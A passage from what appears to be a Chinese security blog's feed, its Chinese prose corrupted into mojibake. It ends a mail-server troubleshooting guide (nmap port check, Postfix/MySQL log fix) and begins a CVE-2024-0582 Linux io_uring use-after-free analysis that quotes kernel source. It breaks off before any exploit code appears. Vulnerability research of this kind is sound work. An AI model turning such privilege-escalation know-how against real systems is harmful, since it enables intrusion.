æµ‹è¯•ä¸ç™»å½•é‚®ä»¶ç³»ç»Ÿ"></a>0x02. æµ‹è¯•ä¸ç™»å½•é‚®ä»¶ç³»ç»Ÿ</h1><h2 id="ä½¿ç”¨-Outlook-Thunderbird-ç­‰è½¯ä»¶è¿›è¡Œç™»å½•"><a href="#ä½¿ç”¨-Outlook-Thunderbird-ç­‰è½¯ä»¶è¿›è¡Œç™»å½•" class="headerlink" title="ä½¿ç”¨ Outlook&#x2F;Thunderbird ç­‰è½¯ä»¶è¿›è¡Œç™»å½•"></a>ä½¿ç”¨ Outlook&#x2F;Thunderbird ç­‰è½¯ä»¶è¿›è¡Œç™»å½•</h2><p><a href="https://www.thunderbird.net/en-US/">Thunderbird</a> æ˜¯ä¸€ä¸ªå¼€æºçš„é‚®ä»¶å®¢æˆ·ç«¯ï¼Œå¯ä»¥ç›´æ¥è¯†åˆ«å¹¶ç™»å½•ï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼š</p><p><img src="https://s2.loli.net/2025/04/13/7gcFrhH1M6IQ8UP.png"></p><p><a href="https://www.microsoft.com/en-us/microsoft-365/outlook/outlook-for-windows">Outlook</a> ç”µè„‘ç«¯ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è¯†åˆ«å‡º IMAP æœåŠ¡å™¨å¹¶ç™»å½•ï¼Œä¸è¿‡ä½ å¯èƒ½è¿˜ä¼šéœ€è¦æ ¹æ®è‡ªå·±çš„æœåŠ¡å™¨é…ç½®æ‰‹åŠ¨ä¿®æ”¹ä¸€äº›ä¸œè¥¿ï¼š</p><p><img src="https://s2.loli.net/2025/04/13/Pru9fFl52pMKd8T.png"></p><p>ä¸è¿‡ Outlook ä¼šæŠŠä½ çš„é‚®ä»¶ç»™å·ä¸€ä»½åˆ°å¾®è½¯è‡ªå·±çš„ Outlook æœåŠ¡å™¨ä¸Šï¼Œè¿™ä¸ªå°±é…Œæƒ…è€ƒè™‘äº†ï¼š</p><p><img src="https://s2.loli.net/2025/04/13/9uQUWE3gPdFo7y6.png"></p><blockquote><p>ç§»åŠ¨ç«¯åŒç”µè„‘ç«¯</p></blockquote><h2 id="ä½¿ç”¨-OpenSSL-å•ç‹¬æµ‹è¯•æœ¬åœ°ç«¯å£"><a href="#ä½¿ç”¨-OpenSSL-å•ç‹¬æµ‹è¯•æœ¬åœ°ç«¯å£" class="headerlink" title="ä½¿ç”¨ OpenSSL å•ç‹¬æµ‹è¯•æœ¬åœ°ç«¯å£"></a>ä½¿ç”¨ OpenSSL å•ç‹¬æµ‹è¯•æœ¬åœ°ç«¯å£</h2><blockquote><p>ğŸ•Š</p></blockquote><h1 id="0x03-å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#0x03-å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="0x03. å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>0x03. å¯èƒ½é‡åˆ°çš„é—®é¢˜</h1><h2 id="æ²¡æœ‰åŠæ³•æ¥æ”¶-å‘é€é‚®ä»¶"><a href="#æ²¡æœ‰åŠæ³•æ¥æ”¶-å‘é€é‚®ä»¶" class="headerlink" title="æ²¡æœ‰åŠæ³•æ¥æ”¶&#x2F;å‘é€é‚®ä»¶"></a>æ²¡æœ‰åŠæ³•æ¥æ”¶&#x2F;å‘é€é‚®ä»¶</h2><p>ä¸€èˆ¬æ˜¯äº‘æœåŠ¡å™¨å‚å•†åšäº†é™åˆ¶ï¼Œä¾‹å¦‚ <a href="https://app.vmiss.com/announcements/23?language=chinese&utm_source=chatgpt.com">VMISS</a> å°±é™åˆ¶äº†ä¸å°‘ç«¯å£ï¼š</p><p><img src="https://s2.loli.net/2025/04/13/Agbk3IRBn62Lhe7.png"></p><p>å¯ä»¥ <strong>åœ¨å¦ä¸€å°è®¾å¤‡ä¸Š</strong> ç”¨ nmap æ£€æŸ¥ç«¯å£å¯è®¿é—®çŠ¶æ€ï¼Œä¾‹å¦‚ç¬”è€…åœ¨ VMISS ä¸Šä¹°çš„æœåŠ¡å™¨çš„ 25 ç«¯å£å°±æœ‰ç‚¹é—®é¢˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmap -Pn ä½ çš„é‚®ä»¶åŸŸå</span><br>Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-12 18:40 EDT<br>Nmap scan report for ä½ çš„é‚®ä»¶åŸŸå (ä½ çš„IP)<br>Host is up (0.16s latency).<br>Not shown: 992 closed tcp ports (conn-refused)<br>PORT    STATE    SERVICE<br>22/tcp  open     ssh<br>25/tcp  filtered smtp<br>110/tcp open     pop3<br>143/tcp open     imap<br>465/tcp open     smtps<br>587/tcp open     submission<br>993/tcp open     imaps<br>995/tcp open     pop3s<br><br>Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å°±åªèƒ½è¦ä¹ˆæ¢æœåŠ¡å™¨è¦ä¹ˆæƒ³åŠæ³•è®©å‚å•†å¼€æ”¾ç«¯å£äº†ï¼Œæ²¡å•¥å¥½çš„è§£å†³æ–¹æ¡ˆï¼šï¼ˆ</p><h2 id="å‘ä¿¡æ—¶é‡åˆ°-451-4-3-0-Temporary-lookup-failure"><a href="#å‘ä¿¡æ—¶é‡åˆ°-451-4-3-0-Temporary-lookup-failure" class="headerlink" title="å‘ä¿¡æ—¶é‡åˆ° 451 4.3.0 Temporary lookup failure"></a>å‘ä¿¡æ—¶é‡åˆ° 451 4.3.0 Temporary lookup failure</h2><p><strong>è¿™ä¸ªé—®é¢˜å¾€å¾€å‡ºç°åœ¨ä½ å°è¯•åœ¨ Debian ä¸Šä½¿ç”¨ MySQL è€Œé MariaDB ä½œä¸ºä½ çš„æ•°æ®åº“çš„åœºæ™¯ä¸‹</strong></p><p>ï¼Œè¿™ä¸ªæ—¶å€™ä½ æŸ¥çœ‹é‚®ä»¶æ—¥å¿—å¯èƒ½å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /var/log/mail.log</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br>Apr 12 16:49:42 mail postfix/trivial-rewrite[41805]: warning: connect to mysql server 127.0.0.1:3306: Plugin caching_sha2_password could not be loaded: /usr/lib/x86_64-linux-gnu/libmariadb3/plugin/caching_sha2_password.so: cannot open shared object file: No such file or directory<br>Apr 12 16:49:42 mail postfix/trivial-rewrite[41805]: warning: virtual_mailbox_domains: mysql:/etc/postfix/mysql-virtual-mailbox-domains.cf: table lookup problem<br>Apr 12 16:49:42 mail postfix/trivial-rewrite[41805]: warning: virtual_mailbox_domains lookup failure<br>Apr 12 16:49:42 mail postfix/trivial-rewrite[41805]: warning: virtual_mailbox_domains: mysql:/etc/postfix/mysql-virtual-mailbox-domains.cf: table lookup problem<br>Apr 12 16:49:42 mail postfix/trivial-rewrite[41805]: warning: virtual_mailbox_domains lookup failure<br>Apr 12 16:49:42 mail postfix/submission/smtpd[41799]: NOQUEUE: reject: RCPT from localhost[::1]: 451 4.3.0 &lt;arttnba3@ğŸ‘´çš„åŸŸå&gt;: Temporary lookup failure; from=&lt;é‚®ç®±åœ°å€&gt; to=&lt;é‚®ç®±åœ°å€&gt; proto=ESMTP helo=&lt;ä¸»æœºå&gt;<br></code></pre></td></tr></table></figure><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯ Debian çš„ Postfix  <strong>é»˜è®¤é“¾æ¥åˆ° MariaDB ç›¸å…³çš„åº“è€Œé MySQL</strong> ï¼Œå› æ­¤é»˜è®¤ä½¿ç”¨ MariaDB Clientï¼ˆå“ªæ€•ä½ å®‰è£…äº† libmysqlclient åŒ…ï¼ŒPostfix ä¹Ÿä¸ä¼šå»ç”¨ï¼‰ï¼ŒMySQL é»˜è®¤ç”¨çš„ <code>chaching_sha2_password</code> åœ¨ MariaDB é‡Œ <strong>æ²¡æœ‰</strong> ï¼Œè‡ªç„¶è¿æ¥ä¸ä¸Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ldd /usr/lib/postfix/postfix-mysql.so</span><br>        linux-vdso.so.1 (0x00007fff9f9b5000)<br>        libmariadb.so.3 =&gt; /lib/x86_64-linux-gnu/libmariadb.so.3 (0x00007fcb2df44000)<br>        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb2dd63000)<br>        libz.so.1 =&gt; /lib/x86_64-linux-gnu/libz.so.1 (0x00007fcb2dd44000)<br>        libssl.so.3 =&gt; /lib/x86_64-linux-gnu/libssl.so.3 (0x00007fcb2dc9b000)<br>        libcrypto.so.3 =&gt; /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007fcb2d800000)<br>        /lib64/ld-linux-x86-64.so.2 (0x00007fcb2dfab000)<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ldd /usr/lib/postfix/sbin/trivial-rewrite</span><br>        linux-vdso.so.1 (0x00007ffd4faf3000)<br>        libpostfix-master.so =&gt; /usr/lib/postfix/libpostfix-master.so (0x00007f709beff000)<br>        libpostfix-global.so =&gt; /usr/lib/postfix/libpostfix-global.so (0x00007f709beb2000)<br>        libpostfix-util.so =&gt; /usr/lib/postfix/libpostfix-util.so (0x00007f709be68000)<br>        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f709bc83000)<br>        libdb-5.3.so =&gt; /lib/x86_64-linux-gnu/libdb-5.3.so (0x00007f709bac1000)<br>        libnsl.so.2 =&gt; /lib/x86_64-linux-gnu/libnsl.so.2 (0x00007f709baa4000)<br>        libicuuc.so.72 =&gt; /lib/x86_64-linux-gnu/libicuuc.so.72 (0x00007f709b8a6000)<br>        /lib64/ld-linux-x86-64.so.2 (0x00007f709bf17000)<br>        libtirpc.so.3 =&gt; /lib/x86_64-linux-gnu/libtirpc.so.3 (0x00007f709b878000)<br>        libicudata.so.72 =&gt; /lib/x86_64-linux-gnu/libicudata.so.72 (0x00007f7099a00000)<br>        libstdc++.so.6 =&gt; /lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f7099600000)<br>        libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f7099920000)<br>        libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f709b856000)<br>        libgssapi_krb5.so.2 =&gt; /lib/x86_64-linux-gnu/libgssapi_krb5.so.2 (0x00007f709b803000)<br>        libkrb5.so.3 =&gt; /lib/x86_64-linux-gnu/libkrb5.so.3 (0x00007f7099846000)<br>        libk5crypto.so.3 =&gt; /lib/x86_64-linux-gnu/libk5crypto.so.3 (0x00007f709b7d6000)<br>        libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f7099840000)<br>        libkrb5support.so.0 =&gt; /lib/x86_64-linux-gnu/libkrb5support.so.0 (0x00007f7099832000)<br>        libkeyutils.so.1 =&gt; /lib/x86_64-linux-gnu/libkeyutils.so.1 (0x00007f709982b000)<br>        libresolv.so.2 =&gt; /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007f709981a000)<br></code></pre></td></tr></table></figure><p>æœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ <strong>ä¸ä½¿ç”¨ MySQL è€Œæ˜¯ä½¿ç”¨ MariaDBï¼Œè¿™æ ·ä¸€åˆ‡é—®é¢˜ä¾¿èƒ½è¿åˆƒè€Œè§£ï¼Œç¬”è€…ä¸å»ºè®®å¤§å®¶å»æŠ˜è…¾å…¶ä»–è§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºä¼šéå¸¸éº»çƒ¦</strong> </p><blockquote><p>å¯èƒ½ä¼šæœ‰äººæƒ³åˆ°è·å–å¯ä»¥æ›´æ”¹ MySQL çš„è®¤è¯æ’ä»¶ä¸º <code>mysql_native_password</code> ä½¿å¾— MariaDB èƒ½å…¼å®¹ï¼Œä½†æ˜¯ Debian ä¸Šä¼šé‡åˆ°ä¸€ç³»åˆ—çš„å„ç§é—®é¢˜ï¼Œç®€è€Œè¨€ä¹‹ç¬”è€…æƒ³äº†å¾ˆå¤šæ–¹æ³•éƒ½æœªèƒ½æˆåŠŸï¼šï¼ˆ</p><p>ä»¥åŠä¼¼ä¹åœ¨ Debian ä¸Šä¹Ÿæ²¡æœ‰ç®€å•çš„åŠæ³•èƒ½è®© Postfix é»˜è®¤ä½¿ç”¨ MySQL è€Œé MariaDBï¼Œ <del>è¿™æ—¶å°±ä½“ç°å‡º Gentoo çš„ USE flag çš„ä¼˜è¶Šæ€§æ‰€åœ¨äº†</del></p></blockquote><h2 id="Undelivered-Mail-Returned-to-Sender"><a href="#Undelivered-Mail-Returned-to-Sender" class="headerlink" title="Undelivered Mail Returned to Sender"></a>Undelivered Mail Returned to Sender</h2><blockquote><p>å‡ºé”™äº†ï¼Œä½†æˆ‘ä»¬åšå¯¹äº†.jpg</p></blockquote><p>æœ‰çš„æ—¶å€™åœ¨ä½ å‘å®Œé‚®ä»¶ä¹‹åå¯èƒ½ä¼šæ”¶åˆ°è¿™æ ·ä¸€å°é‚®ä»¶ï¼š</p><p><img src="https://s2.loli.net/2025/04/13/LQmcXwG1bOqJayh.png"></p><p>è¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬è€Œè¨€ <strong>ä½ çš„é…ç½®æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œåªæ˜¯ä½ çš„æœåŠ¡å™¨ä¾›åº”å•†çš„ç½‘æ®µè¢«å¯¹æ–¹ç»™æ‹‰é»‘äº†</strong> ï¼Œå› æ­¤ä½ å‘å‡ºå»çš„é‚®ä»¶ä¼šè¢«æ‹’æ”¶</p><p>è§£å†³æ–¹æ¡ˆé™¤äº†é€šè¿‡æ¢ VPS ä¾›åº”å•†çš„æ–¹å¼æ›´æ¢åˆ°ä¸åŒ IP æ®µä»¥å¤–åº”è¯¥æ²¡æœ‰åˆ«çš„åŠæ³•ï¼šï¼ˆ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨ Debian ä¸Šç”¨ MySQL è·Ÿâ„¢æ€äººäº†ä¸€æ ·&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x0Cã€‘CVE-2024-0582 æ¼æ´åˆ†æåŠåˆ©ç”¨</title>
    <link href="https://arttnba3.github.io/2025/02/22/CVE-0X0C-CVE-2024-0582/"/>
    <id>https://arttnba3.github.io/2025/02/22/CVE-0X0C-CVE-2024-0582/</id>
    <published>2025-02-21T18:33:26.000Z</published>
    <updated>2025-06-25T15:15:57.315Z</updated>
    
    <content type="html"><![CDATA[<p>Pwn å®Œä¸€ç»“ç®— io_uring å¾—äº† MVPï¼mmap å°±æ˜¯èººèµ¢ç‹—ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://nvd.nist.gov/vuln/detail/cve-2024-0582">CVE-2024-0582</a> æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨ Linux kernel çš„ <a href="https://man7.org/linux/man-pages/man7/io_uring.7.html">io_uring</a> è¿™ä¸€é«˜æ€§èƒ½å¼‚æ­¥ IO API ä¸­çš„æ¼æ´ï¼Œå¾—ç›Šäºå¯¹ä½¿ç”¨ <code>IORING_REGISTER_PBUF_RING</code> æ³¨å†Œçš„ ring buffer åœ¨ <code>mmap()</code> æ˜ å°„çš„æƒ…å†µä¸‹å­˜åœ¨å¯ä»¥åœ¨é‡Šæ”¾åä»è¢«ä½¿ç”¨çš„ UAF æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æ”»å‡»å†…æ ¸ä»¥å®Œæˆæœ¬åœ°ææƒï¼›è¯¥æ¼æ´çš„ CVSS åˆ†æ•°ä¸º <code>7.8</code> ï¼Œå½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äº <code>6.4~6.6.5</code> ï¼Œæœ¬æ–‡æˆ‘ä»¬é€‰ç”¨ <code>6.4</code> ç‰ˆæœ¬çš„å†…æ ¸æºç è¿›è¡Œåˆ†æ</p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè¯·å…ˆè‡ªè¡Œäº†è§£ <code>IO_URING</code> ç›¸å…³çš„åŸºç¡€çŸ¥è¯†</p><blockquote><p>ç­‰åé¢æœ‰æ›´å¤šæ—¶é—´äº†ç¬”è€…å†å†™å‡ ç¯‡ <code>io_uring</code> ç›¸å…³çš„åšå®¢ï¼Œç°åœ¨å…ˆğŸ•Šç€ï¼šï¼‰</p></blockquote><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01. æ¼æ´åˆ†æ"></a>0x01. æ¼æ´åˆ†æ</h1><h2 id="PBUF-RING-Internal"><a href="#PBUF-RING-Internal" class="headerlink" title="PBUF_RING Internal"></a>PBUF_RING Internal</h2><p>ä¼—æ‰€å‘¨çŸ¥ <code>IO_URING</code> æä¾›äº†ä¸‹é¢ä¸‰ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li><code>io_uring_setup()</code>ï¼šåˆ›å»º <code>io_uring</code> ä¸Šä¸‹æ–‡ï¼Œä¸»è¦æ˜¯åˆ›å»ºä¸€ä¸ª SQ é˜Ÿåˆ—ä¸ä¸€ä¸ª CQ é˜Ÿåˆ—ï¼Œå¹¶æŒ‡å®š queue çš„å…ƒç´ æ•°é‡ï¼›è¯¥ç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä»¥ä¾›æˆ‘ä»¬è¿›è¡Œåç»­æ“ä½œ</li><li><code>io_uring_register()</code>ï¼šæ“ä½œç”¨äºå¼‚æ­¥ I&#x2F;O çš„<strong>æ–‡ä»¶æˆ–ç”¨æˆ·ç¼“å†²åŒº</strong>ï¼ˆfiles or user buffersï¼‰ï¼Œä¸»è¦æœ‰æ³¨å†Œï¼ˆåœ¨å†…æ ¸ä¸­åˆ›å»ºæ–°çš„ç¼“å†²åŒºï¼‰ã€æ›´æ–°ï¼ˆæ›´æ–°ç¼“å†²åŒºå†…å®¹ï¼‰ã€æ³¨é”€ï¼ˆé‡Šæ”¾ç¼“å†²åŒºï¼‰ç­‰æ“ä½œï¼Œå·²ç»æ³¨å†Œçš„ç¼“å†²åŒºå¤§å°æ— æ³•è°ƒæ•´</li><li><code>io_uring_enter()</code>ï¼šæäº¤æ–°çš„ I&#x2F;O è¯·æ±‚ï¼Œå¯ä»¥é€‰æ‹©æ˜¯å¦ç­‰å¾… I&#x2F;O å®Œæˆ</li></ul><p>å¯¹äº <code>io_uring_register()</code> ï¼Œå…¶ç³»ç»Ÿè°ƒç”¨åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE4(io_uring_register, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, opcode,<br><span class="hljs-type">void</span> __user *, arg, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, nr_args)<br></code></pre></td></tr></table></figure><p>åœ¨å…¶æ ¸å¿ƒé€»è¾‘çš„ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_uring_register">__io_uring_register()</a> å‡½æ•°å½“ä¸­æœ‰ä¸€ä¸ªå¤§çš„ <code>switch</code> æ¥ä¸ºä¸åŒçš„ opcode è°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨äºä¸ <code>PBUF_RING</code> ç›¸å…³çš„éƒ¨åˆ†</p><h3 id="I-æ³¨å†Œï¼šIORING-REGISTER-PBUF-RING"><a href="#I-æ³¨å†Œï¼šIORING-REGISTER-PBUF-RING" class="headerlink" title="I. æ³¨å†Œï¼šIORING_REGISTER_PBUF_RING"></a>I. æ³¨å†Œï¼šIORING_REGISTER_PBUF_RING</h3><p>å¯¹äºè¿™ä¸ªæ¼æ´æˆ‘ä»¬ä¸»è¦å…³æ³¨å½“ <code>opcode == IORING_REGISTER_PBUF_RING</code> çš„æƒ…å†µï¼Œè¯¥ opcode æ„å‘³ç€æ³¨å†Œä¸€ä¸ªç¯å½¢ç¼“å†²åŒºï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨åˆ° <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_register_pbuf_ring">io_register_pbuf_ring()</a> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_register_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">reg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>, *<span class="hljs-title">free_bl</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="hljs-keyword">sizeof</span>(reg)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">if</span> (reg.resv[<span class="hljs-number">0</span>] || reg.resv[<span class="hljs-number">1</span>] || reg.resv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg.flags &amp; ~IOU_PBUF_RING_MMAP)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP)) &#123;<br><span class="hljs-keyword">if</span> (!reg.ring_addr)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (reg.ring_addr &amp; ~PAGE_MASK)<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (reg.ring_addr)<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!is_power_of_2(reg.ring_entries))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* cannot disambiguate full vs empty due to head/tail size */</span><br><span class="hljs-keyword">if</span> (reg.ring_entries &gt;= <span class="hljs-number">65536</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (unlikely(reg.bgid &lt; BGID_ARRAY &amp;&amp; !ctx-&gt;io_bl)) &#123;<br><span class="hljs-type">int</span> ret = io_init_bl_list(ctx);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>bl = io_buffer_get_list(ctx, reg.bgid);<br><span class="hljs-keyword">if</span> (bl) &#123;<br><span class="hljs-comment">/* if mapped buffer ring OR classic exists, don&#x27;t allow */</span><br><span class="hljs-keyword">if</span> (bl-&gt;is_mapped || !list_empty(&amp;bl-&gt;buf_list))<br><span class="hljs-keyword">return</span> -EEXIST;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_bl = bl = kzalloc(<span class="hljs-keyword">sizeof</span>(*bl), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!bl)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP))<br>ret = io_pin_pbuf_ring(&amp;reg, bl);<br><span class="hljs-keyword">else</span><br>ret = io_alloc_pbuf_ring(&amp;reg, bl);<br><br><span class="hljs-keyword">if</span> (!ret) &#123;<br>bl-&gt;nr_entries = reg.ring_entries;<br>bl-&gt;mask = reg.ring_entries - <span class="hljs-number">1</span>;<br><br>io_buffer_add_list(ctx, bl, reg.bgid);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>kfree(free_bl);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç•¥è¿‡å„ç§å‚æ•°æ£€æŸ¥ç­‰ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶æ ¸å¿ƒé€»è¾‘ï¼š</p><ul><li>é¦–å…ˆè°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_buffer_get_list">io_buffer_get_list()</a> è·å–å·²ç»å­˜åœ¨çš„ <code>io_buffer_list</code> ç»“æ„ä½“ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ†é…</li><li>å¦‚æœè¯·æ±‚ä¸­å¸¦æœ‰ <code>IOU_PBUF_RING_MMAP</code> æ ‡å¿—ä½ï¼Œè°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> ç”±å†…æ ¸åˆ†é…è¿ç»­é¡µé¢ï¼Œå¦åˆ™è°ƒç”¨ <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pin_pbuf_ring">io_pin_pbuf_ring()</a> å°†æ¥è‡ªç”¨æˆ·æ€çš„é¡µé¢ pin åˆ° ring ä¸Š</li><li>å®Œæˆåå°†ç»“æœå†™å…¥å‰é¢åˆ†é…çš„ <code>io_buffer_list</code> ç»“æ„ä½“ä¸­è®°å½•ï¼Œå¹¶å°†è¯¥  <code>io_buffer_list</code> æ”¾åˆ°å½“å‰çš„ä¸Šä¸‹æ–‡ä¸­</li></ul><p>è¿™é‡Œçš„å­æ ‡å¿—ä½ä¸»è¦ç”¨æ¥æŒ‡ç¤º ring buffer çš„åˆ†é…è€…ï¼Œè‹¥è®¾ç½®äº† <code>IOU_PBUF_RING_MMAP</code> æ„å‘³ç€ç”±å†…æ ¸åˆ†é…ç¯å½¢ç¼“å†²åŒºçš„å†…å­˜ï¼Œä¹‹åç”¨æˆ·æ€åº”ç”¨ä½¿ç”¨ <code>mmap()</code> æ˜ å°„ä»¥è®¿é—®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 